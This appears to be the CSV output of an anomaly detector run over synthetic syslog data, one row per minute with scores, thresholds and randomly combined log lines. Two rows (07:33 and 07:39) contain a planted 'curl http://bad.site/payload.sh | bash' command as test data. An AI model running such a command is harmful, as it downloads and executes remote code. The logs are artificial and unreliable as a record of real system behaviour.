bucket,early_warning_score,predict_raw,predict_confirmed,threshold,k_confirm,lines,example_text
2026-07-01 07:08:00,0.9948912780422209,0,0,0.9999894441123176,3,63,unix_chkpwd: Accepted publickey for user from 10.0.0.73 port 22 ssh2. || unattended-upgrades: Listening on LVM2 poll daemon socket. || systemd-timesyncd: Rotating log files. || sshd: Accepted publickey for user from 10.0.0.241 port 22 ssh2. || gpm: L
2026-07-01 07:09:00,0.998201564874556,0,0,0.9999894441123176,3,60,ufw: Accepted publickey for user from 10.0.0.45 port 22 ssh2. || rsyslogd: Started CUPS Scheduler. || CRON: Started CUPS Scheduler. || logrotate: Accepted publickey for user from 10.0.0.219 port 22 ssh2. || NetworkManager: Started Session c238 of use
2026-07-01 07:10:00,0.9994148659423655,0,0,0.9999894441123176,3,60,ntpd: Synced RTC time from system clock. || docker: Started Cleanup of Temporary Directories. || named: Started Session c24 of user root. || docker: Rotating log files. || xinetd: Started Cleanup of Temporary Directories. || cups: Finished Daily apt 
2026-07-01 07:11:00,0.9984735768374177,0,0,0.9999894441123176,3,57,sudo: Synced RTC time from system clock. || chronyd: Started Session c106 of user root. || telnetd: Finished Daily apt download activities. || smartd: Rotating log files. || sshd: Finished Daily apt download activities. || sudo: [UFW BLOCK] IN=eth0 O
2026-07-01 07:12:00,0.9999708856984877,0,0,0.9999894441123176,3,64,dockerd: Started Cleanup of Temporary Directories. || cups: Finished Daily apt download activities. || ftpd: Started Cleanup of Temporary Directories. || smartd: Started Cleanup of Temporary Directories. || xinetd: Accepted publickey for user from 10
2026-07-01 07:13:00,0.9998909371728065,0,0,0.9999894441123176,3,57,ftpd: Synced RTC time from system clock. || ntpd: Rotating log files. || NetworkManager: Rotating log files. || cups: Listening on LVM2 poll daemon socket. || cups: Started Cleanup of Temporary Directories. || systemd-timesyncd: Finished Daily apt do
2026-07-01 07:14:00,0.9993329812869906,0,0,0.9999894441123176,3,62,ntpd: Listening on LVM2 poll daemon socket. || sudo: Accepted publickey for user from 10.0.0.123 port 22 ssh2. || ntpd: Listening on LVM2 poll daemon socket. || logrotate: Rotating log files. || ftpd: Started Session c121 of user root. || CRON: Rotat
2026-07-01 07:15:00,0.9995430586899764,0,0,0.9999894441123176,3,60,rsyslogd: Synced RTC time from system clock. || unix_chkpwd: Listening on LVM2 poll daemon socket. || dockerd: Accepted publickey for user from 10.0.0.160 port 22 ssh2. || docker: Started CUPS Scheduler. || xinetd: Finished Daily apt download activit
2026-07-01 07:16:00,0.9999725043448092,0,0,0.9999894441123176,3,62,dockerd: Synced RTC time from system clock. || unattended-upgrades: Finished Daily apt download activities. || kernel: Started Cleanup of Temporary Directories. || xinetd: Started Cleanup of Temporary Directories. || sshd: Rotating log files. || logr
2026-07-01 07:17:00,0.9996614181281347,0,0,0.9999894441123176,3,60,ntpd: Synced RTC time from system clock. || docker: Finished Daily apt download activities. || sshd: Accepted publickey for user from 10.0.0.56 port 22 ssh2. || gpm: Rotating log files. || unix_chkpwd: Accepted publickey for user from 10.0.0.225 port
2026-07-01 07:18:00,0.997866162099582,0,0,0.9999894441123176,3,61,ntpd: kernel: Out of memory: Kill process 30733 (python3) score 987 or sacrifice child || ntpd: Synced RTC time from system clock. || sudo: Started Session c211 of user root. || chronyd: Started CUPS Scheduler. || named: Listening on LVM2 poll daemon
2026-07-01 07:19:00,0.9993898398435213,0,0,0.9999894441123176,3,61,NetworkManager: Started Session c252 of user root. || kernel: Synced RTC time from system clock. || unix_chkpwd: Started CUPS Scheduler. || kernel: Accepted publickey for user from 10.0.0.72 port 22 ssh2. || ufw: Finished Daily apt download activitie
2026-07-01 07:20:00,0.9994797752530922,0,0,0.9999894441123176,3,61,chronyd: Finished Daily apt download activities. || ftpd: Synced RTC time from system clock. || unix_chkpwd: Started Session c190 of user root. || redis-server: Started CUPS Scheduler. || logrotate: Synced RTC time from system clock. || xinetd: Accep
2026-07-01 07:21:00,0.997973007444149,0,0,0.9999894441123176,3,58,redis-server: Finished Daily apt download activities. || unattended-upgrades: Started Session c62 of user root. || systemd-timesyncd: Started CUPS Scheduler. || sshd: Rotating log files. || rsyslogd: Started Cleanup of Temporary Directories. || rsysl
2026-07-01 07:22:00,0.9978359661697563,0,0,0.9999894441123176,3,60,sshd: Started Session c166 of user root. || ufw: Synced RTC time from system clock. || NetworkManager: Started CUPS Scheduler. || ufw: Accepted publickey for user from 10.0.0.147 port 22 ssh2. || unattended-upgrades: Synced RTC time from system clock
2026-07-01 07:23:00,0.9915833946283563,0,0,0.9999894441123176,3,59,chronyd: Accepted publickey for user from 10.0.0.126 port 22 ssh2. || logrotate: Rotating log files. || chronyd: Started Cleanup of Temporary Directories. || ntpd: Synced RTC time from system clock. || CRON: Started CUPS Scheduler. || rsyslogd: Start
2026-07-01 07:24:00,0.999504009334219,0,0,0.9999894441123176,3,57,NetworkManager: Synced RTC time from system clock. || rsyslogd: Accepted publickey for user from 10.0.0.28 port 22 ssh2. || ftpd: Started Session c160 of user root. || ntpd: Started CUPS Scheduler. || rsyslogd: Accepted publickey for user from 10.0.0
2026-07-01 07:25:00,0.998971841908404,0,0,0.9999894441123176,3,59,systemd-timesyncd: Accepted publickey for user from 10.0.0.112 port 22 ssh2. || rsyslogd: Accepted publickey for user from 10.0.0.82 port 22 ssh2. || docker: Accepted publickey for user from 10.0.0.142 port 22 ssh2. || rsyslogd: Listening on LVM2 pol
2026-07-01 07:26:00,0.9998291192210323,0,0,0.9999894441123176,3,63,dockerd: Rotating log files. || unattended-upgrades: Started Cleanup of Temporary Directories. || systemd: kernel: Kernel panic - not syncing: Fatal exception || redis-server: Started Session c90 of user root. || ftpd: Started Cleanup of Temporary Di
2026-07-01 07:27:00,0.9996154932871758,0,0,0.9999894441123176,3,62,smartd: Started CUPS Scheduler. || CRON: Accepted publickey for user from 10.0.0.133 port 22 ssh2. || smartd: Synced RTC time from system clock. || ufw: Synced RTC time from system clock. || dockerd: Accepted publickey for user from 10.0.0.228 port 2
2026-07-01 07:28:00,0.9977397895885014,0,0,0.9999894441123176,3,61,kernel: Synced RTC time from system clock. || gpm: Finished Daily apt download activities. || rsyslogd: Synced RTC time from system clock. || named: Rotating log files. || sudo: Rotating log files. || redis-server: Listening on LVM2 poll daemon socke
2026-07-01 07:29:00,0.9979490470303197,0,0,0.9999894441123176,3,55,docker: Started Session c220 of user root. || NetworkManager: Finished Daily apt download activities. || docker: Started Cleanup of Temporary Directories. || named: Started CUPS Scheduler. || ftpd: Started Cleanup of Temporary Directories. || Network
2026-07-01 07:30:00,0.9966422062876368,0,0,0.9999894441123176,3,58,named: Started Session c208 of user root. || named: Listening on LVM2 poll daemon socket. || unix_chkpwd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || NetworkManager: Rotating log files. || systemd: Starte
2026-07-01 07:31:00,0.9928942416680114,0,0,0.9999894441123176,3,59,unattended-upgrades: Accepted publickey for user from 10.0.0.127 port 22 ssh2. || named: Finished Daily apt download activities. || systemd-timesyncd: Listening on LVM2 poll daemon socket. || xinetd: Synced RTC time from system clock. || ufw: Started
2026-07-01 07:32:00,0.9988622497665768,0,0,0.9999894441123176,3,59,chronyd: Accepted publickey for user from 10.0.0.16 port 22 ssh2. || logrotate: Listening on LVM2 poll daemon socket. || CRON: Rotating log files. || unattended-upgrades: Synced RTC time from system clock. || chronyd: Started Cleanup of Temporary Dir
2026-07-01 07:33:00,0.9957702757088317,0,0,0.9999894441123176,3,63,telnetd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || gpm: Started CUPS Scheduler. || xinetd: Accepted publickey for user from 10.0.0.31 port 22 ssh2. || sshd: Synced RTC time from system clock. || named: Finished Daily apt download ac
2026-07-01 07:34:00,0.9988087005137735,0,0,0.9999894441123176,3,61,ntpd: Synced RTC time from system clock. || redis-server: Started Cleanup of Temporary Directories. || docker: Started Cleanup of Temporary Directories. || gpm: Finished Daily apt download activities. || systemd-timesyncd: Rotating log files. || kern
2026-07-01 07:35:00,0.986307639408223,0,0,0.9999894441123176,3,61,ntpd: Listening on LVM2 poll daemon socket. || ftpd: Started Session c72 of user root. || sudo: Started CUPS Scheduler. || ftpd: Rotating log files. || telnetd: Started Cleanup of Temporary Directories. || unattended-upgrades: Started CUPS Scheduler.
2026-07-01 07:36:00,0.9994177602367438,0,0,0.9999894441123176,3,63,dockerd: Rotating log files. || ftpd: kernel: Out of memory: Kill process 3700 (python3) score 987 or sacrifice child || systemd-timesyncd: Started Session c219 of user root. || unattended-upgrades: Accepted publickey for user from 10.0.0.218 port 22
2026-07-01 07:37:00,0.9994032993033081,0,0,0.9999894441123176,3,66,gpm: Started CUPS Scheduler. || xinetd: [UFW BLOCK] IN=eth0 OUT= MAC= SRC=1.2.3.30607 DST=10.0.0.1 LEN=60 TOS=0x00 PREC=0x00 TTL=53 || kernel: Accepted publickey for user from 10.0.0.214 port 22 ssh2. || gpm: Synced RTC time from system clock. || sma
2026-07-01 07:38:00,0.9998886211381085,0,0,0.9999894441123176,3,65,logrotate: Started Cleanup of Temporary Directories. || redis-server: Started Session c47 of user root. || kernel: Started Cleanup of Temporary Directories. || gpm: Synced RTC time from system clock. || ftpd: Started CUPS Scheduler. || redis-server: 
2026-07-01 07:39:00,0.9997252599853756,0,0,0.9999894441123176,3,62,smartd: bash: -c: line 1: curl http://bad.site/payload.sh | bash || rsyslogd: Accepted publickey for user from 10.0.0.237 port 22 ssh2. || logrotate: Started CUPS Scheduler. || dockerd: Finished Daily apt download activities. || NetworkManager: Synce
2026-07-01 07:40:00,0.999922781019577,0,0,0.9999894441123176,3,62,ftpd: Rotating log files. || redis-server: Finished Daily apt download activities. || systemd: Started Cleanup of Temporary Directories. || ntpd: Listening on LVM2 poll daemon socket. || unix_chkpwd: Listening on LVM2 poll daemon socket. || sudo: Lis
2026-07-01 07:41:00,0.9997764261695817,0,0,0.9999894441123176,3,61,ftpd: Listening on LVM2 poll daemon socket. || CRON: Started Cleanup of Temporary Directories. || telnetd: Started CUPS Scheduler. || telnetd: Started Cleanup of Temporary Directories. || sshd: Listening on LVM2 poll daemon socket. || docker: Synced 
2026-07-01 07:42:00,0.9999650765936411,0,0,0.9999894441123176,3,59,CRON: Finished Daily apt download activities. || unattended-upgrades: Finished Daily apt download activities. || smartd: Listening on LVM2 poll daemon socket. || sshd: Started Session c108 of user root. || unattended-upgrades: Started Session c28 of 
2026-07-01 07:43:00,0.9997990973793836,0,0,0.9999894441123176,3,62,telnetd: Started Session c219 of user root. || docker: Finished Daily apt download activities. || sudo: Listening on LVM2 poll daemon socket. || ntpd: Synced RTC time from system clock. || systemd: Finished Daily apt download activities. || logrotate
2026-07-01 07:44:00,0.9994924110085398,0,0,0.9999894441123176,3,60,gpm: Listening on LVM2 poll daemon socket. || gpm: Finished Daily apt download activities. || logrotate: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || systemd: Finished Daily apt download activities. || Net
2026-07-01 07:45:00,0.9936463065652675,0,0,0.9999894441123176,3,59,systemd: Rotating log files. || docker: Started Cleanup of Temporary Directories. || smartd: Listening on LVM2 poll daemon socket. || xinetd: Started Session c106 of user root. || xinetd: Accepted publickey for user from 10.0.0.70 port 22 ssh2. || te
2026-07-01 07:46:00,0.9993794596261172,0,0,0.9999894441123176,3,58,cups: Started Session c162 of user root. || systemd-timesyncd: Synced RTC time from system clock. || sshd: Finished Daily apt download activities. || systemd-timesyncd: Rotating log files. || sudo: Started Cleanup of Temporary Directories. || redis-s
2026-07-01 07:47:00,0.9989050185884821,0,0,0.9999894441123176,3,58,NetworkManager: Synced RTC time from system clock. || kernel: Rotating log files. || rsyslogd: Started Session c111 of user root. || named: Started Cleanup of Temporary Directories. || sudo: Listening on LVM2 poll daemon socket. || redis-server: Star
2026-07-01 07:48:00,0.995273858519658,0,0,0.9999894441123176,3,60,chronyd: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || kernel: Started Cleanup of Temporary Directories. || ftpd: Accepted publickey for user from 10.0.0.39 port 22 ssh2. || smartd: Listening on LVM2 poll d
2026-07-01 07:49:00,0.9974894044455133,0,0,0.9999894441123176,3,63,logrotate: Started Session c235 of user root. || gpm: Listening on LVM2 poll daemon socket. || cups: Finished Daily apt download activities. || ntpd: Rotating log files. || systemd: Started CUPS Scheduler. || redis-server: Finished Daily apt download
2026-07-01 07:50:00,0.9989648240511693,0,0,0.9999894441123176,3,57,sshd: Rotating log files. || systemd-timesyncd: Finished Daily apt download activities. || ufw: Listening on LVM2 poll daemon socket. || sudo: Finished Daily apt download activities. || ftpd: Started Session c30 of user root. || systemd: Synced RTC t
2026-07-01 07:51:00,0.9995918483778595,0,0,0.9999894441123176,3,64,named: Started CUPS Scheduler. || sudo: Started Session c172 of user root. || logrotate: Listening on LVM2 poll daemon socket. || dockerd: Accepted publickey for user from 10.0.0.34 port 22 ssh2. || smartd: Accepted publickey for user from 10.0.0.234
2026-07-01 07:52:00,0.9993101301357298,0,0,0.9999894441123176,3,60,telnetd: Started CUPS Scheduler. || gpm: Started Cleanup of Temporary Directories. || redis-server: Synced RTC time from system clock. || kernel: Started CUPS Scheduler. || unix_chkpwd: Accepted publickey for user from 10.0.0.46 port 22 ssh2. || syst
2026-07-01 07:53:00,0.9998004930536232,0,0,0.9999894441123176,3,62,docker: Rotating log files. || cups: Started Cleanup of Temporary Directories. || docker: Listening on LVM2 poll daemon socket. || xinetd: Finished Daily apt download activities. || cups: Synced RTC time from system clock. || gpm: Accepted publickey 
2026-07-01 07:54:00,0.9998031185049354,0,0,0.9999894441123176,3,60,ufw: app[1234]: segfault at 0 ip 00007f stackpointer error 4 in lib.so[7f000] (core dumped) || cups: Accepted publickey for user from 10.0.0.125 port 22 ssh2. || logrotate: Accepted publickey for user from 10.0.0.69 port 22 ssh2. || ftpd: Finished Da
2026-07-01 07:55:00,0.999943635681785,0,0,0.9999894441123176,3,60,named: Rotating log files. || systemd: Started CUPS Scheduler. || chronyd: Started Session c25 of user root. || xinetd: Started Session c164 of user root. || CRON: Synced RTC time from system clock. || dockerd: Synced RTC time from system clock. || c
2026-07-01 07:56:00,0.9993376758773662,0,0,0.9999894441123176,3,58,unix_chkpwd: Finished Daily apt download activities. || systemd-timesyncd: Rotating log files. || ufw: Started Cleanup of Temporary Directories. || unattended-upgrades: Accepted publickey for user from 10.0.0.86 port 22 ssh2. || sudo: Synced RTC time
